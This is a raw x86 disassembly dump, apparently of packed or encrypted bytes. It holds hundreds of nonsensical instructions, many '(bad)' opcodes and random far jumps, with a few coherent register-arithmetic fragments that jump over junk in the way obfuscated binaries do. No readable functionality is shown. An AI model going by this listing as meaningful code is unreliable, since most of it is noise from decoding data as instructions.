  414372:	clc    
  414373:	je     0x414320
  414375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414376:	cmp    DWORD PTR [ebp-0x48f34770],esp
  41437c:	jns    0x41438d
  41437e:	add    DWORD PTR [esi+0x4d],0x70
  414382:	ret    
  414383:	mov    edi,0xdba8afe8
  414388:	imul   al
  41438a:	mov    edx,0x8f3d0138
  41438f:	or     ah,bl
  414391:	add    edx,DWORD PTR [ebx-0x7729a916]
  414397:	les    eax,FWORD PTR [ebx+eiz*8+0x47]
  41439b:	push   cs
  41439c:	adc    eax,0xa4c9ba57
  4143a1:	shl    BYTE PTR [eax],cl
  4143a3:	out    0xdc,eax
  4143a5:	leave  
  4143a6:	loop   0x4143cb
  4143a8:	inc    edx
  4143a9:	popa   
  4143aa:	pop    edi
  4143ab:	fwait
  4143ac:	dec    edx
  4143ad:	retf   
  4143ae:	adc    al,0xc6
  4143b0:	lds    ebp,FWORD PTR [edx]
  4143b2:	and    DWORD PTR [edx-0x61745279],eax
  4143b8:	sub    edx,ecx
  4143ba:	lea    edi,[edi+ebx*1+0x327298]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	fistp  QWORD PTR [eax]
  4143e6:	mov    eax,0x7f09c191
  4143eb:	js     0x4143d2
  4143ed:	jle    0x414467
  4143ef:	js     0x41440d
  4143f1:	or     BYTE PTR [esi],dh
  4143f3:	sub    DWORD PTR [eax+0x4a],esp
  4143f6:	sub    ebp,DWORD PTR [edi+0x6d9eb996]
  4143fc:	(bad)  
  4143fd:	hlt    
  4143fe:	call   0xbdb1f4c3
  414403:	push   0x3b
  414405:	xor    ecx,esp
  414407:	or     bl,ah
  414409:	jno    0x414481
  41440b:	ret    
  41440c:	mov    ds,WORD PTR [ecx]
  41440e:	pop    edi
  41440f:	xor    edx,DWORD PTR [eax-0x18]
  414412:	in     eax,0xe3
  414414:	xchg   ebx,eax
  414415:	xchg   ebx,eax
  414416:	ins    BYTE PTR es:[edi],dx
  414417:	mov    ebp,0xe26310d
  41441c:	std    
  41441d:	or     BYTE PTR [edi],ch
  41441f:	adc    ebx,DWORD PTR [esp+ebp*8]
  414422:	xchg   ecx,eax
  414423:	xor    al,0xf4
  414425:	ror    DWORD PTR [edi+0x3d],1
  414428:	sbb    edi,edi
  41442a:	jge    0x414475
  41442c:	fisttp DWORD PTR [ebp+0xd]
  41442f:	adc    al,0x58
  414431:	inc    esi
  414432:	jg     0x414490
  414434:	push   cs
  414435:	and    BYTE PTR [ebx],bh
  414437:	ror    BYTE PTR cs:[esi-0x69],1
  41443b:	mov    cl,BYTE PTR [edi]
  41443d:	jns    0x414482
  41443f:	xchg   ebx,eax
  414440:	adc    dl,BYTE PTR [esi-0x77c9ba69]
  414446:	retf   0xa430
  414449:	je     0x41449d
  41444b:	or     ch,ch
  41444d:	or     eax,0xc1b64e5e
  414452:	push   edi
  414453:	imul   ebp,DWORD PTR [esi+edi*8-0x75],0xed500e44
  41445b:	call   0x8ae6:0xbcb52cc2
  414462:	add    DWORD PTR [esi-0x1311b5cb],edi
  414468:	aas    
  414469:	fcmovnbe st,st(7)
  41446b:	(bad)  
  41446c:	icebp  
  41446d:	xchg   ebp,eax
  41446e:	fcmovnu st,st(4)
  414470:	repnz ror BYTE PTR [ebx+eiz*2-0x3c81c4eb],0x14
  414479:	mov    ebx,0xb08681d8
  41447e:	mov    esp,0x413b6fc3
  414483:	push   esp
  414484:	fld    DWORD PTR [eax]
  414486:	dec    esp
  414487:	cmp    ch,ch
  414489:	aas    
  41448a:	js     0x414481
  41448c:	sub    eax,0x951a337b
  414491:	inc    ebx
  414492:	aad    0xea
  414494:	inc    ecx
  414495:	fs stc 
  414497:	mov    eax,ds:0xe5083830
  41449c:	por    mm4,QWORD PTR [eax-0x50]
  4144a0:	div    BYTE PTR [ebp+0x5aa5ea79]
  4144a6:	mov    ch,0x90
  4144a8:	pop    edi
  4144a9:	je     0x414515
  4144ab:	mov    ecx,0xbc516140
  4144b0:	sti    
  4144b1:	pushf  
  4144b2:	adc    al,0x3
  4144b4:	mov    BYTE PTR [ebx+0x34],bl
  4144b7:	xchg   ebx,eax
  4144b8:	out    dx,eax
  4144b9:	push   es
  4144ba:	inc    esi
  4144bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144bc:	fadd   QWORD PTR [esi+0x4111cb14]
  4144c2:	(bad)  
  4144c3:	inc    eax
  4144c4:	or     BYTE PTR [ebp+0x6dad72e0],dl
  4144ca:	cmp    eax,0xcea3594b
  4144cf:	push   edx
  4144d0:	icebp  
  4144d1:	push   cs
  4144d2:	mov    al,ds:0x78e423ce
  4144d7:	add    eax,0xfcd88f4c
  4144dc:	ficom  WORD PTR [edi+0x42]
  4144df:	ins    DWORD PTR es:[edi],dx
  4144e0:	inc    esp
  4144e1:	arpl   WORD PTR [ecx-0x45afea5b],bx
  4144e7:	push   eax
  4144e8:	idiv   DWORD PTR [ebp+0x38]
  4144eb:	jecxz  0x4144fe
  4144ed:	adc    DWORD PTR [edi+ebx*2],edx
  4144f0:	jp     0x414550
  4144f2:	(bad)  
  4144f3:	sbb    BYTE PTR [ecx-0x74182070],dh
  4144f9:	cli    
  4144fa:	cmc    
  4144fb:	and    DWORD PTR [edx],edi
  4144fd:	shl    al,cl
  4144ff:	rol    DWORD PTR [ebx-0x53],1
  414502:	mov    cl,0x88
  414504:	cs add eax,0x53bdaaab
  41450a:	in     al,dx
  41450b:	xchg   BYTE PTR [edx+0xad5aa74],dh
  414511:	sub    al,BYTE PTR [edx+0x68]
  414514:	hlt    
  414515:	dec    ecx
  414516:	push   es
  414517:	loop   0x4144b0
  414519:	mov    edx,edi
  41451b:	repnz in al,dx
  41451d:	sbb    BYTE PTR [ebp-0x6a],bl
  414520:	loope  0x4144af
  414522:	adc    eax,0xb1f95634
  414527:	mov    edx,0x90601de4
  41452c:	xor    DWORD PTR [esi+ecx*1],ebx
  41452f:	inc    edx
  414530:	pusha  
  414531:	xchg   BYTE PTR [ebx],dh
  414533:	jl     0x414573
  414535:	inc    eax
  414536:	fs mov ebx,0xc58b7d41
  41453c:	adc    al,0xc6
  41453e:	rcr    bl,cl
  414540:	mov    edi,0xce077c5c
  414545:	sub    al,0x1b
  414547:	dec    edx
  414548:	test   al,0x29
  41454a:	or     edi,DWORD PTR [ebx]
  41454c:	cmp    bh,BYTE PTR [ecx]
  41454e:	inc    esi
  41454f:	mov    bh,0xd8
  414551:	and    edi,DWORD PTR [ebx+0x42]
  414554:	add    BYTE PTR [bx-0x7a],ah
  414558:	and    al,0x14
  41455b:	sbb    esp,DWORD PTR [edi]
  41455d:	inc    ecx
  41455e:	test   ecx,esi
  414560:	xchg   BYTE PTR [edi+0x4c],ah
  414563:	ins    BYTE PTR es:[edi],dx
  414564:	adc    dh,dl
  414566:	push   0xfff68bbc
  41456b:	dec    ebx
  41456c:	(bad)  [eax+0x6cf05cc0]
  414572:	loop   0x4145c4
  414574:	(bad)  
  414575:	fincstp 
  414577:	sub    dl,BYTE PTR [edx+0x77b140bf]
  41457d:	pop    ecx
  41457e:	inc    ebx
  41457f:	sbb    DWORD PTR [ecx-0x7b2a2054],ecx
  414585:	cdq    
  414586:	mov    ecx,0xc93f447b
  41458b:	neg    DWORD PTR [ebp+0x3bb0ab5f]
  414591:	aas    
  414592:	mov    eax,ds:0xabb85393
  414597:	mov    eax,ds:0x13065734
  41459c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41459d:	lea    ebx,[ebx]
  41459f:	mov    bl,0x13
  4145a1:	lods   eax,DWORD PTR ds:[esi]
  4145a2:	fsubrp st(4),st
  4145a4:	in     eax,dx
  4145a5:	mov    WORD PTR [edx+0x1862aadf],?
  4145ab:	mov    WORD PTR [edx-0x7d],fs
  4145ae:	jecxz  0x414605
  4145b0:	jne    0x4145aa
  4145b2:	sbb    eax,0x61c87cd4
  4145b7:	mov    ebx,0x3f1a69f7
  4145bc:	loopne 0x414587
  4145be:	xor    dh,bl
  4145c0:	mov    al,ds:0xa13bdc36
  4145c5:	mov    fs,eax
  4145c7:	mov    ch,0xd1
  4145c9:	xlat   BYTE PTR ds:[ebx]
  4145ca:	les    ebx,FWORD PTR [edx+0x639b97bf]
  4145d0:	mov    dh,0xa0
  4145d2:	xor    edi,DWORD PTR [eax]
  4145d4:	mov    cl,0xdf
  4145d6:	stos   BYTE PTR es:[edi],al
  4145d7:	loop   0x41455d
  4145d9:	xor    eax,0xa1ce82d0
  4145de:	fcmovnu st,st(1)
  4145e0:	arpl   WORD PTR [esi+0x157bf714],dx
  4145e6:	dec    eax
  4145e7:	cmp    DWORD PTR [edx-0x19f9bdd9],eax
  4145ed:	ret    0xa1dc
  4145f0:	add    BYTE PTR [eax+ebx*2],0x1e
  4145f4:	sub    al,0xfb
  4145f6:	add    BYTE PTR [ebx+0x41],bh
  4145f9:	repz rcr BYTE PTR [ebp-0x46],0xae
  4145fe:	mul    BYTE PTR [ebx]
  414600:	dec    edi
  414601:	sbb    BYTE PTR [edi],dh
  414603:	dec    esp
  414604:	jb     0x4145ec
  414606:	out    0x8b,al
  414608:	and    ecx,DWORD PTR [ecx-0x10b3b5d4]
  41460e:	xor    eax,DWORD PTR [esi-0x66]
  414611:	retf   0x59ba
  414614:	(bad)  
  414615:	ficom  WORD PTR [ebx-0x3a]
  414618:	pop    ss
  414619:	ret    0xd1e6
  41461c:	fadd   st,st(1)
  41461e:	jmp    0x414676
  414620:	sbb    ebp,DWORD PTR [ecx+0xe]
  414623:	into   
  414624:	mov    gs,WORD PTR [eax]
  414626:	mov    ch,0xbf
  414628:	sub    esp,DWORD PTR [edx]
  41462a:	mov    esp,0xfae93ef2
  41462f:	push   0x1c
  414631:	and    al,ah
  414633:	and    eax,0xede735b3
  414638:	sti    
  414639:	loopne 0x41462a
  41463b:	mov    DWORD PTR [edi-0x31],edx
  41463e:	jmp    0x414659
  414640:	int3   
  414641:	pop    eax
  414642:	mov    ch,0xae
  414644:	retf   0xb9ae
  414647:	mov    BYTE PTR [ecx+esi*1+0x750dad0e],0x18
  41464f:	lahf   
  414650:	retf   0x364a
  414653:	inc    esp
  414654:	pop    esp
  414655:	jge    0x41467b
  414657:	lods   al,BYTE PTR ds:[esi]
  414658:	in     eax,0xa0
  41465a:	sahf   
  41465b:	imul   edx,edi
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	xor    BYTE PTR [ebp+esi*4+0xfaeb4ef],0x7f
  414679:	js     0x414660
  41467b:	jle    0x4146f5
  41467d:	js     0x41467c
  41467f:	sbb    eax,0xa6ecbf18
  414684:	and    ah,bh
  414686:	test   eax,0x697d72cf
  41468b:	xchg   DWORD PTR [esi-0x57],esp
  41468e:	jecxz  0x4146fc
  414690:	push   0xffffff95
  414692:	hlt    
  414693:	hlt    
  414694:	nop
  414695:	jp     0x4146f6
  414697:	mov    cl,0x6
  414699:	adc    al,0xe0
  41469b:	sbb    DWORD PTR [edx+0x14979d8a],esp
  4146a1:	in     eax,dx
  4146a2:	push   eax
  4146a3:	cmp    cl,BYTE PTR fs:[ecx-0x57d712ab]
  4146aa:	sahf   
  4146ab:	cdq    
  4146ac:	enter  0x3228,0x27
  4146b0:	stos   DWORD PTR es:[edi],eax
  4146b1:	fnstcw WORD PTR [edx-0x54707b36]
  4146b7:	adc    eax,0x5c6c511
  4146bc:	aad    0x9c
  4146be:	nop
  4146bf:	(bad)  
  4146c0:	mov    al,0x77
  4146c2:	push   ds
  4146c3:	or     al,0x49
  4146c5:	cld    
  4146c6:	push   0xffffffca
  4146c8:	mov    DWORD PTR ds:0xc5b56bcb,edx
  4146ce:	or     al,0xbf
  4146d0:	lods   eax,DWORD PTR ds:[esi]
  4146d1:	inc    BYTE PTR [ebx+0x33]
  4146d4:	mov    dh,BYTE PTR [ecx-0x5fae610f]
  4146da:	bound  ecx,QWORD PTR [edx-0x6a]
  4146dd:	(bad)  
  4146de:	shl    BYTE PTR [ebx-0x79403f3],0x61
  4146e5:	imul   ebp,DWORD PTR [edx+ebx*8],0x24dfb346
  4146ec:	mov    edi,0x3aa27f37
  4146f1:	fimul  WORD PTR [esi+eiz*8+0x57f2ffb3]
  4146f8:	imul   edx,DWORD PTR [ecx],0x2fe15060
  4146fe:	or     ch,0x3a
  414701:	nop
  414702:	arpl   dx,dx
  414704:	dec    esp
  414705:	xlat   BYTE PTR ds:[ebx]
  414706:	cmp    BYTE PTR [edi],dh
  414708:	mov    eax,ds:0x954f33a6
  41470d:	jg     0x4146f3
  41470f:	mov    esp,0x72c6d45b
  414714:	jbe    0x4146ff
  414716:	loop   0x4146d0
  414718:	fwait
  414719:	arpl   sp,dx
  41471b:	mov    dl,0x2e
  41471d:	and    eax,0xcae66e02
  414722:	(bad)  
  414723:	jno    0x41476a
  414725:	mov    al,ds:0x1fc533b
  41472a:	pop    es
  41472b:	(bad)  
  41472c:	jle    0x4146c1
  41472e:	mov    ch,0xeb
  414730:	jns    0x4146db
  414732:	mov    bl,0x73
  414734:	mov    dl,0x4e
  414736:	add    ch,al
  414738:	cmp    bh,BYTE PTR [edi+eax*1]
  41473b:	pop    es
  41473c:	hlt    
  41473d:	mov    cr6,esi
  414740:	std    
  414741:	and    al,0x32
  414743:	cmp    eax,0x35c15d98
  414748:	fmul   QWORD PTR [edx-0x20a48afb]
  41474e:	out    dx,al
  41474f:	pop    edx
  414750:	inc    eax
  414751:	(bad)  
  414752:	inc    ebp
  414753:	stos   BYTE PTR es:[edi],al
  414754:	rcr    DWORD PTR [eax-0x73],0x85
  414758:	sub    DWORD PTR [eax],edi
  41475a:	shl    BYTE PTR [ebx],0x11
  41475d:	mov    dl,0x4
  41475f:	ficom  DWORD PTR [edx+0x0]
  414762:	out    dx,al
  414763:	jno    0x41476d
  414765:	das    
  414766:	movhps xmm7,QWORD PTR [ecx+0x62]
  41476a:	(bad)  
  41476b:	xchg   ecx,eax
  41476c:	jle    0x414794
  41476e:	adc    BYTE PTR [edi-0x75],ah
  414771:	cmp    ebp,DWORD PTR [ebx]
  414773:	shr    BYTE PTR [esi+0x2d],1
  414776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414777:	popa   
  414778:	data16 fiadd WORD PTR [eax]
  41477b:	ins    DWORD PTR es:[edi],dx
  41477c:	jp     0x41476b
  41477e:	sub    eax,0x48c06d89
  414783:	out    dx,eax
  414784:	rcl    BYTE PTR [eax+0xc],1
  414787:	enter  0x20a1,0xd2
  41478b:	inc    esp
  41478c:	pop    edi
  41478d:	hlt    
  41478e:	retf   
  41478f:	mov    eax,0x77c23754
  414794:	nop
  414795:	push   cs
  414796:	cwde   
  414797:	ds pop ecx
  414799:	push   esp
  41479a:	mov    ds:0xa36e3c70,al
  41479f:	jne    0x41472c
  4147a1:	mov    ebx,0x4296e92a
  4147a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147a7:	adc    eax,0x512c431e
  4147ac:	xchg   edx,eax
  4147ad:	aas    
  4147ae:	pop    edx
  4147af:	retf   
  4147b0:	leave  
  4147b1:	xlat   BYTE PTR ds:[ebx]
  4147b2:	adc    bl,BYTE PTR ds:0xb44a56f2
  4147b8:	(bad)  
  4147b9:	mov    al,0x88
  4147bb:	dec    esi
  4147bc:	sbb    al,0x3f
  4147be:	aaa    
  4147bf:	push   0x68
  4147c1:	sbb    al,0x20
  4147c3:	dec    edx
  4147c4:	adc    eax,DWORD PTR [ecx-0x3a148bc]
  4147ca:	xor    bl,BYTE PTR [ebx+0x7caf919c]
  4147d0:	adc    BYTE PTR [edx+0x21198372],dl
  4147d6:	jnp    0x414770
  4147d8:	push   ss
  4147d9:	or     cl,BYTE PTR [edx+0x7e]
  4147dc:	add    BYTE PTR [ebx-0x54],cl
  4147df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147e0:	push   ecx
  4147e1:	lods   eax,DWORD PTR ds:[esi]
  4147e2:	mov    ds:0xbbf813de,eax
  4147e7:	rcr    WORD PTR [ecx+eiz*2],0xf
  4147ec:	mov    fs,WORD PTR [esp+eax*8+0x37]
  4147f0:	gs aas 
  4147f2:	into   
  4147f3:	inc    ecx
  4147f4:	and    eax,0xdec86417
  4147f9:	dec    esp
  4147fa:	fs pop edi
  4147fc:	ror    ebx,1
  4147fe:	sub    eax,0x77d8ab2d
  414803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414804:	jo     0x414832
  414806:	rol    esi,0x36
  414809:	jecxz  0x41483b
  41480b:	test   edx,edx
  41480d:	pop    esp
  41480e:	shl    DWORD PTR [eax-0x14aaf22c],1
  414814:	pop    esp
  414815:	pop    ecx
  414816:	sub    al,0x62
  414818:	cmp    cl,BYTE PTR [edx+edi*2-0x63]
  41481c:	add    al,0x79
  41481e:	test   DWORD PTR [edx-0x7493feee],eax
  414824:	mov    esp,0xeba1d703
  414829:	call   0xd879d7be
  41482e:	cs stos BYTE PTR es:[edi],al
  414830:	(bad)  
  414832:	mov    cs,WORD PTR [ecx]
  414834:	in     ax,0x20
  414837:	and    eax,0x13e8cd07
  41483c:	xor    BYTE PTR [ebp-0x11],0x86
  414840:	not    DWORD PTR [edx]
  414842:	icebp  
  414843:	in     al,dx
  414844:	push   edi
  414845:	imul   DWORD PTR [edi-0x1e]
  414848:	je     0x4147e8
  41484a:	xlat   BYTE PTR ds:[ebx]
  41484b:	xchg   ebx,eax
  41484c:	sub    edx,ebx
  41484e:	mov    ds:0xfc04fd6b,al
  414853:	ins    BYTE PTR es:[edi],dx
  414854:	cmp    DWORD PTR [edi+0xa],ebp
  414857:	fdivr  QWORD PTR [ecx-0x1fb892f4]
  41485d:	fnstsw WORD PTR [edi-0xc03f854]
  414863:	je     0x414833
  414865:	jbe    0x414854
  414867:	arpl   di,cx
  414869:	fwait
  41486a:	out    0xd4,al
  41486c:	in     al,0xbb
  41486e:	inc    edx
  41486f:	inc    BYTE PTR [eax]
  414871:	push   cs
  414872:	fst    DWORD PTR ss:[ebx-0x1e6649ec]
  414879:	pop    ecx
  41487a:	cmc    
  41487b:	into   
  41487c:	adc    edi,DWORD PTR [esi]
  41487e:	(bad)  
  41487f:	cmc    
  414880:	aas    
  414881:	sbb    dl,BYTE PTR [eax+esi*4]
  414884:	in     eax,0xbb
  414886:	cwde   
  414887:	int3   
  414888:	jns    0x41485a
  41488a:	iret   
  41488b:	ss nop
  41488d:	xchg   edi,eax
  41488e:	mov    esp,0xa89c5c9d
  414893:	mov    ds:0xdcb5c786,al
  414898:	xchg   esi,eax
  414899:	and    edi,DWORD PTR [edx-0x35152414]
  41489f:	jb     0x414827
  4148a1:	pop    esp
  4148a2:	dec    esi
  4148a3:	dec    ebp
  4148a4:	fisubr DWORD PTR [esi]
  4148a6:	and    cl,BYTE PTR [ebx-0x3f]
  4148a9:	xchg   ebx,eax
  4148aa:	cmp    eax,esi
  4148ac:	xor    eax,0x82da7092
  4148b1:	in     eax,dx
  4148b2:	jp     0x414894
  4148b4:	(bad)  
  4148b5:	mov    ds:0xfa6580f9,eax
  4148ba:	pop    es
  4148bb:	adc    eax,0x5c8b2ba7
  4148c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148c1:	mov    ah,0x35
  4148c3:	xor    ah,ah
  4148c5:	rcr    DWORD PTR [ecx+0x2b],0x86
  4148c9:	scas   al,BYTE PTR es:[edi]
  4148ca:	ins    BYTE PTR es:[edi],dx
  4148cb:	pop    ebp
  4148cc:	adc    al,0xa3
  4148ce:	pop    esi
  4148cf:	pop    esi
  4148d0:	adc    eax,0xddac3977
  4148d5:	shl    ebp,1
  4148d7:	repz xchg esi,eax
  4148d9:	jnp    0x4148e2
  4148db:	jle    0x4148d4
  4148dd:	cmp    BYTE PTR [eax-0x39e998d],0x86
  4148e4:	push   ebx
  4148e5:	dec    ecx
  4148e6:	cdq    
  4148e7:	xchg   edx,eax
  4148e8:	outs   dx,DWORD PTR ds:[esi]
  4148e9:	xor    edi,eax
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax-0x64d87ab5]
  414921:	loop   0x41491d
  414923:	cmp    al,0x1b
  414925:	or     al,0x7f
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x41495f
  41492d:	aam    0x95
  41492f:	mov    bh,0x65
  414931:	mov    bh,0x43
  414933:	(bad)  
  414934:	and    cl,BYTE PTR [ecx+edx*4-0x49]
  414938:	push   esi
  414939:	test   BYTE PTR [esi],cl
  41493b:	push   cs
  41493c:	or     ah,0xbb
  41493f:	add    BYTE PTR [esi],dh
  414941:	and    al,0xf8
  414943:	or     eax,0x528859c6
  414948:	cld    
  414949:	cmp    BYTE PTR [ebp+0x61a2725c],bl
  41494f:	and    BYTE PTR [edx+0x4d352a],bh
  414955:	cli    
  414956:	mov    bh,0xc7
  414958:	psubsb mm3,QWORD PTR [ecx+ecx*1]
  41495c:	retf   
  41495d:	xor    DWORD PTR [eax],0x9ae8ab02
  414963:	retf   0x56c0
  414966:	adc    ebx,edx
  414968:	mov    al,0xb
  41496a:	jo     0x4148f7
  41496c:	aad    0x19
  41496e:	jmp    0x471ca02d
  414973:	out    0xeb,eax
  414975:	push   es
  414976:	aaa    
  414977:	or     al,0x2
  414979:	adc    edi,DWORD PTR [edi+0x71]
  41497c:	arpl   WORD PTR [eax],si
  41497e:	and    DWORD PTR [eax-0x25],esi
  414981:	push   cs
  414982:	outs   dx,DWORD PTR ds:[esi]
  414983:	mov    bl,0x36
  414985:	jae    0x41492b
  414987:	cmp    eax,0x5fa1af4f
  41498c:	add    ah,bh
  41498e:	xor    eax,DWORD PTR [eax-0x159f7a11]
  414994:	aam    0x94
  414996:	pop    edi
  414997:	out    0x6d,eax
  414999:	mov    ebx,0x87ac5a18
  41499e:	ror    BYTE PTR [ecx+eax*1+0x1a6a6882],1
  4149a5:	jmp    0x6f3f:0xe913452a
  4149ac:	pop    ss
  4149ad:	jns    0x414a17
  4149af:	push   ss
  4149b0:	das    
  4149b1:	adc    al,dl
  4149b3:	push   eax
  4149b4:	shl    DWORD PTR [esi-0x52da105],0x49
  4149bb:	shl    DWORD PTR [ebx-0x6dcf8744],cl
  4149c1:	sbb    BYTE PTR [esp+esi*1+0x122f737e],al
  4149c8:	push   es
  4149c9:	xchg   edi,esi
  4149cb:	in     al,0x19
  4149cd:	xchg   ecx,eax
  4149ce:	mul    esi
  4149d0:	ret    
  4149d1:	dec    eax
  4149d2:	inc    edi
  4149d3:	mov    al,ds:0xb3217743
  4149d8:	stc    
  4149d9:	(bad)  
  4149da:	aad    0xa3
  4149dc:	sahf   
  4149dd:	shl    BYTE PTR [edx+esi*8-0x64],cl
  4149e1:	jmp    0x60ca:0x250afeda
  4149e8:	mul    BYTE PTR ds:0x45c8ce6c
  4149ee:	loope  0x41498f
  4149f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149f1:	cmp    al,0xe9
  4149f3:	test   eax,esi
  4149f5:	bound  ebx,QWORD PTR [edi-0x13c7f49]
  4149fb:	in     eax,dx
  4149fc:	test   edx,ecx
  4149fe:	lds    ecx,FWORD PTR [edx-0x59]
  414a01:	(bad)  
  414a02:	imul   ebp,DWORD PTR [ecx],0xed814587
  414a08:	loopne 0x4149b1
  414a0a:	xor    BYTE PTR [ecx+0x7b292e78],dl
  414a10:	gs cli 
  414a12:	adc    eax,DWORD PTR [edx]
  414a14:	cmc    
  414a15:	ret    0x53f9
  414a18:	lods   al,BYTE PTR ds:[esi]
  414a19:	cmp    eax,ecx
  414a1b:	inc    ebp
  414a1c:	pop    edx
  414a1d:	pop    esi
  414a1e:	outs   dx,DWORD PTR ds:[esi]
  414a1f:	cdq    
  414a20:	inc    eax
  414a21:	jo     0x414a8f
  414a23:	sbb    ch,BYTE PTR [ebx-0x409a42bd]
  414a29:	sbb    eax,0x4daa5d98
  414a2e:	cs mov ah,0x7e
  414a31:	sbb    BYTE PTR [esi-0x67],dh
  414a34:	push   ebx
  414a35:	push   ebp
  414a36:	mov    ebp,0x9c82dd0
  414a3b:	push   edi
  414a3c:	(bad)
  414a3f:	adc    al,0x2c
  414a41:	outs   dx,DWORD PTR ds:[esi]
  414a42:	mov    esp,0xa498d043
  414a47:	jmp    0x4149fe
  414a49:	xor    DWORD PTR [ebx-0x633c4888],edi
  414a4f:	ret    
  414a50:	and    dh,BYTE PTR [esp+ebp*8-0x2c192cab]
  414a57:	jbe    0x414a7e
  414a59:	pop    edi
  414a5a:	cmp    eax,ecx
  414a5c:	imul   esp,eax,0xffffffab
  414a5f:	and    ah,bl
  414a61:	and    ecx,DWORD PTR [ebx]
  414a63:	ss cmp al,0xa8
  414a66:	push   ebx
  414a67:	adc    al,0x23
  414a69:	fld    DWORD PTR ds:0x85aac21a
  414a6f:	mov    ah,0x2f
  414a71:	mov    ds:0x19b848b,eax
  414a76:	mov    eax,0xa87c51f7
  414a7b:	jl     0x414a60
  414a7d:	pop    esp
  414a7e:	call   0x91fa:0x64495751
  414a85:	jmp    0x8209e740
  414a8a:	inc    esp
  414a8b:	xchg   esi,eax
  414a8c:	jp     0x414af8
  414a8e:	fild   QWORD PTR [edi-0x53]
  414a91:	mov    ch,0x1
  414a93:	jge    0x414adb
  414a95:	hlt    
  414a96:	mov    es,WORD PTR [edx-0xef313b9]
  414a9c:	xor    BYTE PTR ds:0xe0f9d585,0xa9
  414aa3:	sti    
  414aa4:	push   esp
  414aa5:	xor    eax,0x3ffbf93e
  414aaa:	cld    
  414aab:	mov    eax,ds:0x286e5d24
  414ab0:	(bad)  
  414ab1:	mov    dl,0xd7
  414ab3:	out    dx,eax
  414ab4:	pop    es
  414ab5:	cmp    eax,DWORD PTR [edx]
  414ab7:	(bad)  
  414ab8:	xor    DWORD PTR [eax],ecx
  414aba:	rcr    BYTE PTR [edx-0x3fc7b69b],1
  414ac0:	xor    al,0x6a
  414ac2:	jle    0x414a69
  414ac4:	addr16 and eax,0x53eeda68
  414aca:	push   ebx
  414acb:	xor    eax,0x87e2b36c
  414ad0:	jge    0x414a7e
  414ad2:	mov    edi,0x939ec2ac
  414ad7:	mov    cl,0xbf
  414ad9:	je     0x414a9e
  414adb:	jecxz  0x414a93
  414add:	stos   BYTE PTR es:[edi],al
  414ade:	xor    eax,0xfd3c990d
  414ae3:	add    eax,0x9c3ccfec
  414ae8:	pop    esp
  414ae9:	fcomp  st(3)
  414aeb:	sub    DWORD PTR [ebx+0x26b8797e],esp
  414af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414af2:	dec    eax
  414af3:	rcr    dh,1
  414af5:	loop   0x414b5a
  414af7:	int3   
  414af8:	inc    ebp
  414af9:	push   0xf5d97a4e
  414afe:	pop    ds
  414aff:	test   al,0x15
  414b01:	cmp    DWORD PTR [edi],ebp
  414b03:	or     DWORD PTR ds:0xf7b1b99a,eax
  414b09:	and    DWORD PTR [edi],eax
  414b0b:	aaa    
  414b0c:	add    eax,0xf3405da
  414b11:	jle    0x414b91
  414b13:	outs   dx,DWORD PTR ds:[esi]
  414b14:	mov    edx,0x10d4a3a6
  414b19:	xchg   ebx,eax
  414b1a:	fsubr  DWORD PTR [ebx+ecx*8-0x5b]
  414b1e:	das    
  414b1f:	mov    ah,0x6d
  414b21:	cmp    DWORD PTR [ecx],0x5c3b6b01
  414b27:	test   al,0x9e
  414b29:	sbb    ah,bl
  414b2b:	cdq    
  414b2c:	call   0xc3b15c45
  414b31:	mov    bh,0xea
  414b33:	gs ss inc ebp
  414b36:	push   0xbdb316df
  414b3b:	inc    ecx
  414b3c:	sub    esi,DWORD PTR [esi+ecx*8]
  414b3f:	ins    BYTE PTR es:[edi],dx
  414b40:	stos   DWORD PTR es:[edi],eax
  414b41:	(bad)  
  414b42:	(bad)  
  414b44:	outs   dx,BYTE PTR ds:[esi]
  414b45:	xor    BYTE PTR [esi-0x23ffa6cd],0x61
  414b4c:	imul   ebx,DWORD PTR [eax-0x393de2a8],0xffffffe6
  414b53:	lods   al,BYTE PTR ds:[esi]
  414b54:	pop    edi
  414b55:	retf   0xd89f
  414b58:	inc    esi
  414b59:	and    eax,0x85f58ba
  414b5e:	loope  0x414b70
  414b60:	pop    ss
  414b61:	aad    0x3d
  414b63:	mov    bh,0x7c
  414b65:	xor    ecx,DWORD PTR [ecx+0x5636ba49]
  414b6b:	adc    al,0x6c
  414b6d:	mov    esi,0x96018266
  414b72:	inc    eax
  414b73:	inc    ebx
  414b74:	stos   BYTE PTR es:[edi],al
  414b75:	jle    0x414b4e
